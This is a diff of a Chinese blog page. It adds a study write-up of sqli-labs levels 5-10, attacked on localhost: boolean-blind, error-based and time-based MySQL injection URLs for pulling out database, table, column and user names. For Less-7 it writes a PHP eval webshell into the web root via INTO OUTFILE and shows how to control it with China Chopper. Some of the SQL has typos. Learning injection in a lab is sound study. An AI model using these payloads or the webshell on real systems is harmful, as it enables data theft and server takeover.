@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="less5-xx, 比企谷八幡">
+    <meta name="keywords" content="less5-10, 比企谷八幡">
     <meta name="description" content="用我三生烟火,换你一世迷离。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>less5-xx | 比企谷八幡</title>
+    <title>less5-10 | 比企谷八幡</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">less5-xx</h1>
+                    <h1 class="description center-align post-title">less5-10</h1>
                 </div>
             </div>
         </div>
@@ -458,21 +458,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-20
+                    2020-11-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    57
+                    1.9k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    8 分
                 </div>
                 
 
@@ -482,8 +482,113 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><a href="https://imgchr.com/i/DMgAD1" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMgAD1.png" alt=""></a></p>
-<h2 id="一-补充知识"><a href="#一-补充知识" class="headerlink" title="一.补充知识"></a>一.补充知识</h2><script>
+                <ul>
+<li>注1:从本节开始忽略order by的步骤,因为都是3所以为了方便不再进行赘述</li>
+<li>注2:less5-10中,除了less7要求是用outfile 的方式来进行注入,其他的关卡界面都一样,只有sql语句返回true才会显示语句,否则不显示如下<br><a href="https://imgchr.com/i/DlRLDJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlRLDJ.png" alt="DlRLDJ.png"></a></li>
+</ul>
+<h2 id="一-less5"><a href="#一-less5" class="headerlink" title="一.less5"></a>一.less5</h2><h3 id="1-测试"><a href="#1-测试" class="headerlink" title="1.测试"></a>1.测试</h3><ul>
+<li>单引号测试:在id =1’ ,结果报错,说明此处可以注入,且是单引号注入</li>
+<li>逻辑测试:id=1’ and 1=1 –+  ,可以正常回显,and 1=2 –+,不显示内容,说明存在布尔sql盲注,返回值为true就正常回显,返回值false就回显异常</li>
+</ul>
+<p>网页部分源码:(如果sql语句返回true就输出语句,否则不输出)<br><a href="https://imgchr.com/i/DQob4A" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQob4A.png" alt="DQob4A.png"></a></p>
+<p>猜测sql语句:</p>
+<pre class=" language-SQL"><code class="language-SQL">select xx from xx where id ='XX' and 1=1</code></pre>
+<h3 id="2-布尔盲注"><a href="#2-布尔盲注" class="headerlink" title="2.布尔盲注"></a>2.布尔盲注</h3><p>利用sql语句的特性,我们可以进行暴力破解数据(比如数据库名,数据库的长度,表名);<br>以破解数据库名(security)为例:  </p>
+<ul>
+<li>方法一:(如果纯手动破解,效率低)：<br>(1)用left函数<br>先看一下数据库名，可以正常回显说明数据库名长度为 8<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(databases())=8 --+</code></pre></li>
+<li><strong>说明:left(str,x);表示从左往右显示str的x个字符，返回值是ASCII码;*</strong><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(database(),1)='s' --+</code></pre><a href="https://imgchr.com/i/DQTzxx" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQTzxx.png" alt=""></a></li>
+</ul>
+<p>可以正常回显说明第一个字符确实是’s’,接着用left(database(),2)=’se’,会发现还是可以正常回显,所以第二个字符确实是’e’  </p>
+<p><strong><em>注 : left的比较规则：和C语言的一样,比较第一个不同的字符</em></strong></p>
+<p>(2)用substr()和ascii()<br>说明:   </p>
+<ul>
+<li><p>substr(str,begin,len):第一个参数是字符串,begin是字符串的开始点,len是截取的长度</p>
+</li>
+<li><p>ascii(str):返回str的ascii码</p>
+</li>
+</ul>
+<p>获取security下的第一个表名   </p>
+<pre><code>ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101</code></pre><ul>
+<li>想要查第二个字符后面改成substr(xx,2，1)即可***</li>
+<li>想要查第二个表只要把limit 0,1改成limit 1,1即可  </li>
+<li><strong>注:这里的database()就是’security’;*</strong></li>
+</ul>
+<p>含义拆解:先截取数据库表名然后转换成ascii码进行判断,不断拆解判断每个点</p>
+<p>(3)利用regexp获取（2）中users表中的列名</p>
+<p>regexp的用法:str regexp’^xxx’   ,看str中是否有xxx,必须从前向后匹配,比如 username regexp’^ser’ 返回的是false ,^user返回的是true</p>
+<p>补充知识:</p>
+<pre><code>
+
+#回显的n行的1,n=users表中的行数
+select 1 from users; 
+
+#id=-1是不存在的值,这个时候条件筛选的返回值是false,不会有值搜索出来
+select 1 from users where id =-1
+
+#id=1是存在的值,这个时候条件筛选的返回值是true,会显示一行的1
+select 1 from users where id =1</code></pre><p>注入的sql语句:</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name  regexp'^username'limit 0,1)--+</code></pre><p>拆解下面的sql语句含义:在users的表中select 1并且条件是判断columns中是否有username,如果有,则整句返回1,否则返回空</p>
+<pre><code>select 1 from information_schema.columns where table_name='users' and column_name  regexp'^username'limit 0,1</code></pre><p>总结:对于注入的sql语句,作用就是看看猜测的列名是否正确,如果正确就返回1,此时1=1,整个sql语句返回true可以正常回显,否则无法正常回显(用脚本来试很快)</p>
+<p>(4)利用ord（）和mid（）函数获取users表的内容</p>
+<ul>
+<li>ord(XX):把字母转化成ascii码</li>
+<li>mid(str,begin,length):截取str,begin为起点,1表示第一个字符,length是截取长度  </li>
+</ul>
+<p>含义:</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' and 
+ord(mid((select IFNULL(username,0x20)from security.users order by id limit 0,1),1,1))=68--+
+
+
+#其实这样也可以,不过会不太严谨
+ord(mid((select  username from security.users order by id limit 0,1),1,1))=68--+</code></pre><ul>
+<li><p>方法二(用burpsuit暴力破解) </p>
+<p>具体方法以后再补,先跳过</p>
+</li>
+</ul>
+<h3 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h3><p>(1)报错注入<br>语法</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token keyword">Select</span> <span class="token number">1</span><span class="token punctuation">,</span>
+<span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+concat<span class="token punctuation">(</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token number">a</span>
+<span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> 
+<span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token number">a</span><span class="token punctuation">;</span></code></pre>
+<p>less5的代码:  </p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' 
+union Select 1,count(*),concat(0x3a,0x3a,(select user()),0 x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a--+</code></pre><p>小结:报错注入主要改的是from处的代码,其他地方不用变,如果user表或者rand被禁用,就换图片中的写法</p>
+<p><a href="https://imgchr.com/i/Dl1hzF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/Dl1hzF.png" alt="Dl1hzF.png"></a><br>(2)利用double数值类型超出范围进行报错注入<br><a href="https://imgchr.com/i/DllN3F" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DllN3F.png" alt=""></a></p>
+<p>(2)利用double数值类型超出范围进行报错注入<br>语法</p>
+<pre><code>select exp(~(select * FROM(SELECT USER())a))    //double数值类型超出范围</code></pre><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' union select  (exp((select * FROM(SELECT USER())a))),2,3--+</code></pre><p>(3)利用bigint溢出进行报错注入</p>
+<pre><code>select !(select * from (select user())x) -（ps:这是减号） ~0</code></pre><pre><code>http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+
+</code></pre><h3 id="4-延时注入"><a href="#4-延时注入" class="headerlink" title="4.延时注入"></a>4.延时注入</h3><p>代码含义:以猜数据库名的第一个字符为例子,如果猜错了ascii码额值，就执行sleep(5),网页要等待5s才刷新,否则立刻会刷新</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code></pre><p><a href="https://imgchr.com/i/Dlglr9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dlglr9.png" alt="结果图"></a><br>二.less6<br>同less5 ,只不过变成双引号闭合,把’改成”即可,其他地方相同</p>
+<h2 id="三-less7"><a href="#三-less7" class="headerlink" title="三.less7"></a>三.less7</h2><ul>
+<li>一句话木马<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"root"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span><span class="token shell-comment comment">#root是我设置的密码,可以随便改,必须用双引号括起来</span></code></pre>
+网页提示用out file来解决<br><a href="https://imgchr.com/i/Dl2BSU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/Dl2BSU.png" alt=""></a></li>
+<li>less7代码:  <pre><code>http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,'&lt;?php @eval($_POST["crow"]); ?&gt;' into outfile  'E:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs\\Less-7\\a.php' --+</code></pre>注意点  </li>
+<li>本关要构造’))才能形成正确闭合</li>
+<li>把一句话木马写入Less7的文件夹下,然后再用中国菜刀等web工具打开进行入侵 </li>
+</ul>
+<p>中国菜刀的用法:<br>进行木马写入后,比如上面的a.php,然后右键添加,把php文件的网址路径写入,然后密码写在右侧小框里,确认后回到主页点击刚刚添加的那一项就可以进入文件夹了了<br><a href="https://imgchr.com/i/DlgBqA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgBqA.png" alt=""></a><br><a href="https://imgchr.com/i/DlgyIP" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlgyIP.png" alt=""></a></p>
+<h2 id="四-less8"><a href="#四-less8" class="headerlink" title="四.less8"></a>四.less8</h2><p>这里采用的是单引号闭合id=’1’,盲注手法同less5</p>
+<p>我这里随便举一个延时注入为例</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-8/?id=1'  and If(ascii(substr(database(),1,1))=117,1,sleep(5))--+</code></pre><h2 id="五-less9"><a href="#五-less9" class="headerlink" title="五.less9"></a>五.less9</h2><p>这一关我们先加单引号（id=1’）进行测试后发现数据页面正常回显(实际上sql语句也确实是单引号字符型),然后尝试 and sleep(5),发现页面会执行sleep函数,说明存在注入漏洞  </p>
+<p>后面可以直接用延时注入的手法查看数据即可,方法其实同less5,但是下面我再延时一遍如何利用各个函数调取猜解信息 <strong><em>（这里是对于布尔盲注而言的,and xxx来判断xxx 返回的是true还是false）</em></strong></p>
+<ul>
+<li><p>1.猜解数据库名</p>
+<pre class=" language-SQL"><code class="language-SQL">If(ascii(substr(database(),1,1))=115,1,sleep(5))</code></pre>
+</li>
+<li><p>2.猜测 security 的数据表：<br>用limit 控制想要猜的表</p>
+<pre class=" language-SQL"><code class="language-SQL">If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))</code></pre>
+</li>
+<li><p>3.猜测表中的列名,以users表为例</p>
+<pre class=" language-SQL"><code class="language-SQL">If(ascii(substr((select column_name from information
+_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))</code></pre>
+</li>
+<li><p>4.猜测 username 的值：</p>
+<pre><code>If(ascii(substr((select username from users limit 0,1),
+1,1))=68,1,sleep(5))--+</code></pre></li>
+</ul>
+<h1 id="六-less10"><a href="#六-less10" class="headerlink" title="六.less10"></a>六.less10</h1><p>双引号的字符型注入,后面玩法后less5一样<br><a href="https://imgchr.com/i/DlRdHA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/21/DlRdHA.png" alt=""></a></p>
+<script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -647,19 +752,17 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="less5-xx">
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="less5-10">
                         
-                        <span class="card-title">less5-xx</span>
+                        <span class="card-title">less5-10</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-一.补充知识
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) {
+注1:从本节开始忽略order by的步骤,因为都是3所以为了方便不再进行赘述
+注2:less5-10中,除了less7要求是用outfile 的方式来进行注入,其他的关卡界面都一样,只有sql语句返回true才会显示语句,否则不显示如下
                         
                     </div>
                     <div class="publish-info">
@@ -709,11 +812,12 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            主要记录我在学mysql时忘掉的或没注意到的知识
-
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (
+                            主要记录mysql注入天书中Background中的知识
+一.Background-1基础知识mysql里的一些函数:
+show databases;
+use security;
+show tables；
+desc emails；#查看表结
                         
                     </div>
                     <div class="publish-info">
